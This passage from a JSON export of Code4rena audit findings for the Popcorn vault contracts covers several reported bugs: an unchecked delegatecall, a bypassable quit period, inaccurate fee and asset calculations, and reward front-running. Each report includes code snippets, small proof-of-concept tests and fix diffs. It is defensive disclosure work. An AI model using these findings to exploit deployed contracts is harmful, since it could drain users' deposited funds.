= address(strategy).delegatecall(    abi.encodeWithSignature(\"harvest()\")   );   if(!success) revert StrategyFailed();  }    emit Harvested(); } ```"}, {"title": "Stragety withdrawal fee estimation is not accurate in BeefyAdapter.sol", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/786", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-15"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/beefy/BeefyAdapter.sol#L155 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/beefy/BeefyAdapter.sol#L176   # Vulnerability details  ## Impact  Stragety withdrawal fee estimation is not accurate in BeefAdapter.sol  ## Proof of Concept  In the current implementation of the BeefAdapter.sol, when calling previewWithdraw and and previewRedeem, the code tries to estimate the withdrawal fee from Beefy's stragety contract.  ```solidity /// @notice `previewRedeem` that takes beefy withdrawal fees into account function previewRedeem(uint256 shares)  public  view  override  returns (uint256) {  uint256 assets = _convertToAssets(shares, Math.Rounding.Down);   IBeefyStrat strat = IBeefyStrat(beefyVault.strategy());  uint256 beefyFee = strat.withdrawalFee();  if (beefyFee > 0)   assets -= assets.mulDiv(    beefyFee,    BPS_DENOMINATOR,    Math.Rounding.Up   );   return assets; } ```  and  ```solidity /// @notice `previewWithdraw` that takes beefy withdrawal fees into account function previewWithdraw(uint256 assets)  public  view  override  returns (uint256) {  IBeefyStrat strat = IBeefyStrat(beefyVault.strategy());  uint256 beefyFee = strat.withdrawalFee();  if (beefyFee > 0)   assets = assets.mulDiv(    BPS_DENOMINATOR,    BPS_DENOMINATOR - beefyFee,    Math.Rounding.Up   );   return _convertToShares(assets, Math.Rounding.Up); } ```  However, the withdrawalFee estimate is not accuare.  If we look into the stragety contract if the Beefy finance.  First of all, Beefy finance integrate and develop a lot of stragety.  Some stragety has withdrawalFee exposed.  https://github.com/beefyfinance/beefy-contracts/blob/1a92ee47db78bb625445e8425f53af31fe5e3543/contracts/BIFI/strategies/Curve/StrategyConvex.sol#L102  While others expose the hardcoded parameter:  https://github.com/beefyfinance/beefy-contracts/blob/1a92ee47db78bb625445e8425f53af31fe5e3543/contracts/BIFI/strategies/Mdex/StrategyMdexLP.sol#L79  ```solidity uint constant public WITHDRAWAL_FEE = 10; ```  If a stragety does not expose withdrawalFee  as a read-only parameter, clearly function below does not work  ```solidity int256 beefyFee = strat.withdrawalFee(); ```  Also even though the stragety contract exposes the parameter withdrawalFee,  the fee estimation does not match the fee implementation in the Beefy stragety contract.  The fee estimation used is:  ```solidity    uint256 beefyFee = strat.withdrawalFee();  if (beefyFee > 0)   assets = assets.mulDiv(    BPS_DENOMINATOR,    BPS_DENOMINATOR - beefyFee,    Math.Rounding.Up   ); ```  However, in the Beefy stragety, is  ```solidity     function withdraw(uint256 _amount) external {         require(msg.sender == vault, \"!vault\");          uint256 wantBal = IERC20(want).balanceOf(address(this));          if (wantBal < _amount) {             IConvexRewardPool(rewardPool).withdrawAndUnwrap(_amount - wantBal, false);             wantBal = IERC20(want).balanceOf(address(this));         }          if (wantBal > _amount) {             wantBal = _amount;         }          if (tx.origin != owner() && !paused()) {             uint256 withdrawalFeeAmount = wantBal * withdrawalFee / WITHDRAWAL_MAX;             wantBal = wantBal - withdrawalFeeAmount;         }          IERC20(want).safeTransfer(vault, wantBal);          emit Withdraw(balanceOf());     } ```  which is:;  https://github.com/beefyfinance/beefy-contracts/blob/1a92ee47db78bb625445e8425f53af31fe5e3543/contracts/BIFI/strategies/Curve/StrategyConvex.sol#L131  ```solidity if (tx.origin != owner() && !paused()) {  uint256 withdrawalFeeAmount = wantBal * withdrawalFee / WITHDRAWAL_MAX;  wantBal = wantBal - withdrawalFeeAmount; } ```  Or if the WITHDRAWAL_FEE is used, the withdrawal fee is calculated as:  ```solidity function withdraw(uint256 _amount) external {  require(msg.sender == vault, \"!vault\");   uint256 pairBal = IERC20(lpPair).balanceOf(address(this));   if (pairBal < _amount) {   IMasterChef(masterchef).withdraw(poolId, _amount.sub(pairBal));   pairBal = IERC20(lpPair).balanceOf(address(this));  }   if (pairBal > _amount) {   pairBal = _amount;  }   uint256 withdrawalFee = pairBal.mul(WITHDRAWAL_FEE).div(WITHDRAWAL_MAX);  IERC20(lpPair).safeTransfer(vault, pairBal.sub(withdrawalFee)); } ```  which is:  https://github.com/beefyfinance/beefy-contracts/blob/1a92ee47db78bb625445e8425f53af31fe5e3543/contracts/BIFI/strategies/Mdex/StrategyMdexLP.sol#L163  ```solidity uint256 withdrawalFee = helmetBal.mul(WITHDRAWAL_FEE).div(WITHDRAWAL_MAX); ```  withdrawal max is 10000  Because the estimation of fee when previewing the withdraw and redeem asset does not match the underlying stragety's wtihdrawal fee calcuation.  The number reported by BeefAdapter.sol is previewWithdraw and previewRedeem is wrong.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We reommend the protocol make the stragety withdrawal fee estimation match the Beefy stragety estimation. This can be difficult to implementation, the protocol may need to may the stragety name to the withdrawal fee.  "}, {"title": "`quitPeriod` is effectively always just `1 day`", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/785", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L629-L636   # Vulnerability details  ## Description The `quitPeriod` is supposed to give users time to rage quit if there are changes they don't agree with. The quit period is limited to be within 1 day and a week and can only be changed by `owner`:  ```javascript File: Vault.sol  629:    function setQuitPeriod(uint256 _quitPeriod) external onlyOwner { 630:        if (_quitPeriod < 1 days || _quitPeriod > 7 days) 631:            revert InvalidQuitPeriod(); 632: 633:        quitPeriod = _quitPeriod; 634: 635:        emit QuitPeriodSet(quitPeriod); 636:    } ```  However the change can be done instantly. An owner can propose a change, users will expect to wait three days for it to be applied, and after one day change the `quitPeriod` to `1 day` and apply the changes.  ## Impact Changes to fees and adapters can happen faster than users expect not giving them time enough to react.  ## Proof of Concept Small PoC in `Vault.t.sol`:  ```javascript   function test__set_fees_after_1_day() public {     vault.proposeFees(       VaultFees({         deposit: 1e17,         withdrawal: 1e17,         management: 1e17,         performance: 1e17       })     );     // users expect to have three days     console.log(\"quit period\",vault.quitPeriod());      // jump 1 day     vm.warp(block.timestamp + 1 days);     // owner changes quit period     vault.setQuitPeriod(1 days);     // and does the changes     vault.changeFees();   } ```  ## Tools Used manual audit, vs code, forge  ## Recommended Mitigation Steps Either lock `quitPeriod` changes for the old `quitPeriod`.  Or apply the duration when the change is proposed: ```diff diff --git a/src/vault/Vault.sol b/src/vault/Vault.sol index 7a8f941..bccc561 100644 --- a/src/vault/Vault.sol +++ b/src/vault/Vault.sol @@ -531,14 +531,14 @@ contract Vault is          ) revert InvalidVaultFees();            proposedFees = newFees; -        proposedFeeTime = block.timestamp; +        proposedFeeTime = block.timestamp + quitPeriod;            emit NewFeesProposed(newFees, block.timestamp);      }        /// @notice Change fees to the previously proposed fees after the quit period has passed.      function changeFees() external { -        if (block.timestamp < proposedFeeTime + quitPeriod) +        if (block.timestamp < proposedFeeTime)              revert NotPassedQuitPeriod(quitPeriod);            emit ChangedFees(fees, proposedFees); ```  Same applies for `changeAdapter`"}, {"title": "Total assets of yearn vault are not correct", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/728", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/yearn/YearnAdapter.sol#L109-L111   # Vulnerability details  ## Impact Total assets of yearn vault are not correct so the calculation between the asset and the shares will be wrong.  ## Proof of Concept  In `YearnAdapter` the total assets of current `yValut` are extracted using `_yTotalAssets`.   ```     function _yTotalAssets() internal view returns (uint256) {         return IERC20(asset()).balanceOf(address(yVault)) + yVault.totalDebt(); //@audit     } ```  But in the yearn vault implementation, `self.totalIdle` is used instead of current balance.  ``` def _totalAssets() -> uint256:     # See note on `totalAssets()`.     return self.totalIdle + self.totalDebt ```  In yearn valut, `totalIdle` is the tracked value of tokens, so it is same as vault's balance in most cases, but the balance can be larger due to an attack or other's fault. Even `sweep` is implemented for the case in the vault implementation.   ```     if token == self.token.address:         value = self.token.balanceOf(self) - self.totalIdle      log Sweep(token, value)     self.erc20_safe_transfer(token, self.governance, value) ```  So the result of `_yTotalAssets` can be inflated than the correct total assets and the calculation between the asset and the shares will be incorrect.   ## Tools Used Manual Review  ## Recommended Mitigation Steps Use `yVault.totalIdle` instead of balance."}, {"title": "Owner can trick caller of `MultiRewardStaking.fundReward` into paying all rewards at once.", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/670", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L324 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L296   # Vulnerability details  ## Impact `MultiRewardStaking.fundReward` can be frontrun with a `changeRewardSpeed` call that sets `rewardsPerSecond`to 0. This will cause the rewards to be paid out instantly, which is unexpected behavior.   ## Proof of Concept ```    * @dev If `rewardsPerSecond` is 0 the rewards will be paid out instantly.    */   function fundReward(IERC20 rewardToken, uint256 amount) external {     ...     // rewardsPerSecond will be 0 after changeRewardSpeed was called, so     // the entire amount is accrued at once.     uint256 accrued = rewards.rewardsPerSecond == 0 ? amount : _accrueStatic(rewards);     ...   } ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps Let the user choose the agreed upon `rewardsPerSecond` by adding it as a parameter and then revert if the value is changed: ```diff +  event RewardRateChanged();    ... -  function fundReward(IERC20 rewardToken, uint256 amount) external { +  function fundReward(IERC20 rewardToken, uint256 amount, uint acceptedRewardsPerSecond) external {     ... +   if (rewards.rewardsPerSecond != acceptedRewardsPerSecond) revert RewardRateChanged();      ...   } ``` Or use a propose-accept pattern with a rage quit duration to update `rewardsPerSecond`."}, {"title": "Users can lose funds during adapter migration", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/665", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-41"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613   # Vulnerability details  ## Proof of Concept The Vault contract uses adapters to interact with the other protocols. Accordingly, all adapters are specific to the protocol address that they're adapted to. The vault contract also implements an update mechanism where if the adapter address should be changed. Accordingly, it's a two-step migration where first the owner can set the pending adapter address via `proposeAdapter` and call `changeAdapter` to set a new Adapter for the said Vault after the quit period has passed.  First step: calling `proposeAdapter`; ```solidity     function proposeAdapter(IERC4626 newAdapter) external onlyOwner {         if (newAdapter.asset() != address(asset))             revert VaultAssetMismatchNewAdapterAsset();         proposedAdapter = newAdapter;         proposedAdapterTime = block.timestamp;         emit NewAdapterProposed(newAdapter, block.timestamp);     } ``` [Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L578-L586)  Second step: calling `changeAdapter`; ```solidity     function changeAdapter() external takeFees {         if (block.timestamp < proposedAdapterTime + quitPeriod)             revert NotPassedQuitPeriod(quitPeriod);         adapter.redeem(             adapter.balanceOf(address(this)),             address(this),             address(this)         );         asset.approve(address(adapter), 0);         emit ChangedAdapter(adapter, proposedAdapter);         adapter = proposedAdapter;         asset.approve(address(adapter), type(uint256).max);         adapter.deposit(asset.balanceOf(address(this)), address(this));     } ``` [Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613)    Once the `changeAdapter` is executed by the `owner`, the Vault will be flushed to the new adapter. However, the users will not be aware of this as the UI will not be aware and there is no implementation made at the protocol level to prevent any user deposit to the adapter when the `changeAdapter` is called.   An unfortunate transaction order can happen where the tx of the owner's `changeAdapter` call and the user's `deposit` tx are in the same block or also within 1 block of each other. In this situation, the user will lose the sent funds due to the existing adapter being already migrated and there is no `ERC20.withdraw()` logic implemented in the Vault.  ## Impact Loss of user funds   ## Tools Used Manual Review  ## Recommended Mitigation Steps The team might consider implementing a modifier for the `changeAdapter` function (E.g.; `WhenNotChangeAdapterCalled`).  Accordingly, once the `changeAdapter` is called, the `WhenNotChangeAdapterCalled` modifier can revert the deposits and can add some additional cool-down period to restart the deposits after the migration.   "}, {"title": "`harvest` may fail unnoticed", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/641", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-44"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L438-L450 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L79   # Vulnerability details   ## Summary  `delegateCall` not checked on success value, it may fail and therefore not noticed neither reverted but emitted that harvest succeed, leading to errors on applications that works with this emit errors  ## Vulnerability Detail  Code does not retrieve `delegateCall` return value and proceed taking into account what happened  ## Impact  Call to harvest not being succeeded and unnoticed  ### Proof of Concept   ```solidity /**     * @notice Execute Strategy and take fees.     * @dev Delegatecall to strategy's harvest() function. All necessary data is passed via `strategyConfig`.     * @dev Delegatecall is used to in case any logic requires the adapters address as a msg.sender. (e.g. Synthetix staking)     */ function harvest() public takeFees {     if (         address(strategy) != address(0) &&         ((lastHarvest + harvestCooldown) < block.timestamp)     ) {         // solhint-disable         address(strategy).delegatecall(             abi.encodeWithSignature(\"harvest()\")         );     }      emit Harvested(); } ```  ## Code Snippet  - `harvest`  - [AdapterBase.sol#L438-L450](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L438-L450)  - [AdapterBase.sol#L79](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L79)   ## Tool used  Manual analysis  ## Recommendation  Retrieve transaction success from `delegateCall` and revert if not success "}, {"title": "Small Fees May Lead to the User Not Being Able to Claim Their Rewards for a Certain Amount of Time", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/622", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-49"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L243-L288 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L191-L202   # Vulnerability details  ## Impact  Owners have the freedom to choose any token as the reward token, including arbitrary tokens. Some ERC20 tokens, such as USDC, only have 6 decimal places. When tokens with less than 18 decimal places, such as USDC, are used as the reward token, there is a likelihood that the user will not be able to claim rewards if the fees are too small.  User may not be able to claim rewards for a period of time depending on the `rewardsPerSecond` and the `escrowPercentage`.  ## Proof of Concept  Suppose the owner adds a reward token with only 6 decimal places and selects 1e11 as the `escrowPercentage`, potentially due to a mistake or for any other reason. Users who are accruing tokens are unable to call the `claimRewards()` function if their accrued rewards are not more than 2e6.  ```solidity function addRewardToken(     IERC20 rewardToken,     uint160 rewardsPerSecond,     uint256 amount,     bool useEscrow,     uint192 escrowPercentage,     uint32 escrowDuration,     uint32 offset   ) external onlyOwner {        ...      if (useEscrow) {       escrowInfos[rewardToken] = EscrowInfo({         escrowPercentage: escrowPercentage,         escrowDuration: escrowDuration,         offset: offset       });       rewardToken.safeApprove(address(escrow), type(uint256).max);     }   ...   } ```  For example, when the rewardAmount is `0.9e6`, the user calls the `claimRewards()` function. The `_lockToken()` function is executed, but the escrowed amount will be 0 as `0.9e6 * 1e11 / 1e18` rounds down to 0 after calculation.  ```solidity File: src/utils/MultiRewardStaking.sol  uint256 escrowed = rewardAmount.mulDiv(uint256(escrowInfo.escrowPercentage), 1e18, Math.Rounding.Down); ```  This results in the user being unable to call the `claimRewards()` function, as it will revert when the `MultiRewardEscrow.sol` calls the `lock()` function due to `if (amount == 0) revert ZeroAmount()` condition.  This issue becomes even more pronounced when the fees are small and the accrued rewards rate is slow.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider adding a minimum fee to the function `addRewardToken()` for `escrowPercentage()`."}, {"title": "In `MultiRewardStaking.addRewardToken()`, `rewardsPerSecond` is not accurate enough to handle all type of reward tokens.", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/619", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/2d373f8748a140f5d7a57e738172750811449c04/src/utils/MultiRewardStaking.sol#L245   # Vulnerability details  ## Impact The raw `rewardsPerSecond` might be too big for some ERC20 tokens and it wouldn't work as intended.  ## Proof of Concept As we can see from `_accrueStatic()`, the `rewardsPerSecond` is a raw amount without any multiplier.  ```solidity   function _accrueStatic(RewardInfo memory rewards) internal view returns (uint256 accrued) {     uint256 elapsed;     if (rewards.rewardsEndTimestamp > block.timestamp) {       elapsed = block.timestamp - rewards.lastUpdatedTimestamp;     } else if (rewards.rewardsEndTimestamp > rewards.lastUpdatedTimestamp) {       elapsed = rewards.rewardsEndTimestamp - rewards.lastUpdatedTimestamp;     }      accrued = uint256(rewards.rewardsPerSecond * elapsed);   } ```  But 1 wei for 1 second would be too big amount for some popular tokens like WBTC(8 decimals) and EURS(2 decimals).  For WBTC, it will be 0.31536 WBTC per year (worth about `$7,200`) to meet this requirement, and for EURS, it must be at least 315,360 EURS per year (worth about `$315,000`).  Such amounts might be too big as rewards and the protocol wouldn't work properly for such tokens.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend introducing a `RATE_DECIMALS_MULTIPLIER = 10**9(example)` to increase the precision of `rewardsPerSecond` instead of using the raw amount."}, {"title": "Forget to check whether `amount > 0` before transferring token", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/597", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-54"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardEscrow.sol#L111   # Vulnerability details   ## Summary Function `MultiRewardEscrow.lock()` forget to check if `fee > 0` or not before transferring.   ## Vulnerability Detail Since the reward token can be any ERC20, it can be one of the [weird ERC20](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers) which revert the transfer transaction when `amount = 0`.   Function `lock()` is implemented as follows:  ```solidity= function lock(     IERC20 token,     address account,     uint256 amount,     uint32 duration,     uint32 offset   ) external {     if (token == IERC20(address(0))) revert ZeroAddress();     if (account == address(0)) revert ZeroAddress();     if (amount == 0) revert ZeroAmount();     if (duration == 0) revert ZeroAmount();      token.safeTransferFrom(msg.sender, address(this), amount);      nonce++;      bytes32 id = keccak256(abi.encodePacked(token, account, amount, nonce));      uint256 feePerc = fees[token].feePerc;     if (feePerc > 0) {       uint256 fee = Math.mulDiv(amount, feePerc, 1e18);        amount -= fee;              /// [$audit-med] revert if fee = 0       token.safeTransfer(feeRecipient, fee);     }      uint32 start = block.timestamp.safeCastTo32() + offset;      escrows[id] = Escrow({       token: token,       start: start,       end: start + duration,       lastUpdateTime: start,       initialBalance: amount,       balance: amount,       account: account     });      userEscrowIds[account].push(id);     userEscrowIdsByToken[account][token].push(id);      emit Locked(token, account, amount, duration, offset);   } ``` when `feePerc > 0`, `fee` can get the value 0 if `amount * feePerc < 1e18`. For example:  * `amount = 100`  * `feePerc = 1e10`  ==> `amount * feePerc = 1e12 < 1e18` ==> `fee = 0`  ## Impact The function doesn't work as expected, it will revert if `fee == 0` and the token is ERC20 which reverts the transfer transaction when amount = 0.   ## Tool used Manual Review  ## Recommendation Check whether `fee > 0` before executing the transfer."}, {"title": "Users can fail to withdraw deposited assets from a vault that uses `YearnAdapter` contract as its adapter because `maxLoss` input for calling corresponding Yearn vault's `withdraw` function cannot be specified", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/581", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L210-L235 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/yearn/YearnAdapter.sol#L166-L172 https://github.com/yearn/yearn-vaults/blob/master/contracts/Vault.vy#L1028-L1167   # Vulnerability details  ## Impact For a vault that uses the `YearnAdapter` contract as its adapter, calling the `Vault.withdraw` or `Vault.redeem` function will eventually call the `AdapterBase._withdraw` and `YearnAdapter._protocolWithdraw` functions below when the adapter is not paused. When the `YearnAdapter._protocolWithdraw` function executes `yVault.withdraw(convertToUnderlyingShares(assets, shares))`, the `maxLoss` input is not specified when calling the Yearn vault's `withdraw` function below. Thus, the Yearn vault's `withdraw` function will be called with its default `maxLoss` input value that is 0.01%. If the total loss incurred during the withdrawal is more than 0.01%, calling the Yearn vault's `withdraw` function that executes `assert totalLoss <= maxLoss * (value + totalLoss) / MAX_BPS` will revert. In a bear market, it is possible that the Yearn vault's strategies do not perform well so the total loss can be more than 0.01% permanently. In this situation, calling the `Vault.withdraw` or `Vault.redeem` function will always revert because calling the Yearn vault's `withdraw` function without specifying the `maxLoss` input reverts. As a result, users lose the deposited assets that they are unable to withdraw.  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L210-L235 ```solidity     function _withdraw(         address caller,         address receiver,         address owner,         uint256 assets,         uint256 shares     ) internal virtual override {         ...          if (!paused()) {             uint256 underlyingBalance_ = _underlyingBalance();               _protocolWithdraw(assets, shares);             // Update the underlying balance to prevent inflation attacks             underlyingBalance -= underlyingBalance_ - _underlyingBalance();         }          ...     } ```  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/yearn/YearnAdapter.sol#L166-L172 ```solidity     function _protocolWithdraw(uint256 assets, uint256 shares)         internal         virtual         override     {         yVault.withdraw(convertToUnderlyingShares(assets, shares));     } ```  https://github.com/yearn/yearn-vaults/blob/master/contracts/Vault.vy#L1028-L1167 ```vyper @external @nonreentrant(\"withdraw\") def withdraw(     maxShares: uint256 = MAX_UINT256,     recipient: address = msg.sender,     maxLoss: uint256 = 1,  # 0.01% [BPS] ) -> uint256:     \"\"\"     ...     @param maxLoss         The maximum acceptable loss to sustain on withdrawal. Defaults to 0.01%.         If a loss is specified, up to that amount of shares may be burnt to cover losses on withdrawal.     @return The quantity of tokens redeemed for `_shares`.     \"\"\"     shares: uint256 = maxShares  # May reduce this number below      # Max Loss is <=100%, revert otherwise     assert maxLoss <= MAX_BPS      # If _shares not specified, transfer full share balance     if shares == MAX_UINT256:         shares = self.balanceOf[msg.sender]      # Limit to only the shares they own     assert shares <= self.balanceOf[msg.sender]      # Ensure we are withdrawing something     assert shares > 0      # See @dev note, above.     value: uint256 = self._shareValue(shares)     vault_balance: uint256 = self.totalIdle      if value > vault_balance:         totalLoss: uint256 = 0         # We need to go get some from our strategies in the withdrawal queue         # NOTE: This performs forced withdrawals from each Strategy. During         #       forced withdrawal, a Strategy may realize a loss. That loss         #       is reported back to the Vault, and the will affect the amount         #       of tokens that the withdrawer receives for their shares. They         #       can optionally specify the maximum acceptable loss (in BPS)         #       to prevent excessive losses on their withdrawals (which may         #       happen in certain edge cases where Strategies realize a loss)         for strategy in self.withdrawalQueue:             if strategy == ZERO_ADDRESS:                 break  # We've exhausted the queue              if value <= vault_balance:                 break  # We're done withdrawing              amountNeeded: uint256 = value - vault_balance              # NOTE: Don't withdraw more than the debt so that Strategy can still             #       continue to work based on the profits it has             # NOTE: This means that user will lose out on any profits that each             #       Strategy in the queue would return on next harvest, benefiting others             amountNeeded = min(amountNeeded, self.strategies[strategy].totalDebt)             if amountNeeded == 0:                 continue  # Nothing to withdraw from this Strategy, try the next one              # Force withdraw amount from each Strategy in the order set by governance             preBalance: uint256 = self.token.balanceOf(self)             loss: uint256 = Strategy(strategy).withdraw(amountNeeded)             withdrawn: uint256 = self.token.balanceOf(self) - preBalance             vault_balance += withdrawn              # NOTE: Withdrawer incurs any losses from liquidation             if loss > 0:                 value -= loss                 totalLoss += loss                 self._reportLoss(strategy, loss)              # Reduce the Strategy's debt by the amount withdrawn (\"realized returns\")             # NOTE: This doesn't add to returns as it's not earned by \"normal means\"             self.strategies[strategy].totalDebt -= withdrawn             self.totalDebt -= withdrawn             log WithdrawFromStrategy(strategy, self.strategies[strategy].totalDebt, loss)          self.totalIdle = vault_balance         # NOTE: We have withdrawn everything possible out of the withdrawal queue         #       but we still don't have enough to fully pay them back, so adjust         #       to the total amount we've freed up through forced withdrawals         if value > vault_balance:             value = vault_balance             # NOTE: Burn # of shares that corresponds to what Vault has on-hand,             #       including the losses that were incurred above during withdrawals             shares = self._sharesForAmount(value + totalLoss)          # NOTE: This loss protection is put in place to revert if losses from         #       withdrawing are more than what is considered acceptable.         assert totalLoss <= maxLoss * (value + totalLoss) / MAX_BPS      # Burn shares (full value of what is being withdrawn)     self.totalSupply -= shares     self.balanceOf[msg.sender] -= shares     log Transfer(msg.sender, ZERO_ADDRESS, shares)          self.totalIdle -= value     # Withdraw remaining balance to _recipient (may be different to msg.sender) (minus fee)     self.erc20_safe_transfer(self.token.address, recipient, value)     log Withdraw(recipient, shares, value)          return value ```  ## Proof of Concept The following steps can occur for the described scenario. 1. A vault that uses the `YearnAdapter` contract as its adapter exists. 2. A user calls the `Vault.deposit` function to deposit some asset tokens in the corresponding Yearn vault. 3. A bear market starts so the Yearn vault's strategies do not perform well, and the total loss is more than 0.01% consistently. 4. Calling the `Vault.withdraw` or `Vault.redeem` function always reverts because the user cannot specify the `maxLoss` input for calling the Yearn vault's `withdraw` function. As a result, the user loses the deposited asset tokens.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `YearnAdapter._protocolWithdraw` function can be updated to add an additional input that would be used as the `maxLoss` input for calling the Yearn vault's `withdraw` function. The other functions that call the `YearnAdapter._protocolWithdraw` function need to add this input as well."}, {"title": "VaultController() Missing call DeploymentController.nominateNewDependencyOwner()", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/579", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/DeploymentController.sol#L121-L125   # Vulnerability details  ## Impact Unable to switch to a new deploymentController  ## Proof of Concept  The current protocol supports the replacement of the new DeploymentController, which can be switched by VaultController.setDeploymentController()  Normally, when switching, the owner of the cloneFactory/cloneRegistry/templateRegistry in the old DeploymentController should also be switched to the new DeploymentController DeploymentController's nominateNewDependencyOwner() implementation is as follows: ```solidity   /**    * @notice Nominates a new owner for dependency contracts. Caller must be owner. (`VaultController` via `AdminProxy`)    * @param _owner The new `DeploymentController` implementation    */   function nominateNewDependencyOwner(address _owner) external onlyOwner {     IOwned(address(cloneFactory)).nominateNewOwner(_owner);     IOwned(address(cloneRegistry)).nominateNewOwner(_owner);     IOwned(address(templateRegistry)).nominateNewOwner(_owner);   } ```  But there is a problem here, VaultConttroler.sol does not implement the code to call old_Deployerment.nominateNewDependencyOwner(), resulting in DeploymentController can not switch properly, nominateNewDependencyOwner()'s Remarks: ``` Caller must be owner. (`VaultController` via `AdminProxy`)``` But in fact the VaultController does not have any code to call the nominateNewDependencyOwner ```solidity   function setDeploymentController(IDeploymentController _deploymentController) external onlyOwner {     _setDeploymentController(_deploymentController);   }    function _setDeploymentController(IDeploymentController _deploymentController) internal {     if (address(_deploymentController) == address(0) || address(deploymentController) == address(_deploymentController))       revert InvalidDeploymentController(address(_deploymentController));      emit DeploymentControllerChanged(address(deploymentController), address(_deploymentController));      deploymentController = _deploymentController;     cloneRegistry = _deploymentController.cloneRegistry();     templateRegistry = _deploymentController.templateRegistry();   } ```   ## Tools Used  ## Recommended Mitigation Steps setDeploymentController() need call nominateNewDependencyOwner()  ```solidity contract VaultController is Owned {   function setDeploymentController(IDeploymentController _deploymentController) external onlyOwner {      +    //1. old deploymentController nominateNewDependencyOwner +    (bool success, bytes memory returnData) = adminProxy.execute( +       address(deploymentController), +       abi.encodeWithSelector( +         IDeploymentController.nominateNewDependencyOwner.selector, +         _deploymentController +       ) +     ); +     if (!success) revert UnderlyingError(returnData);  + +    //2. new deploymentController acceptDependencyOwnership +    _deploymentController.acceptDependencyOwnership();        _setDeploymentController(_deploymentController);           }  } ```"}, {"title": "calculation for `BeefyAdapter#previewWithdraw` is wrong", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/568", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-55"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  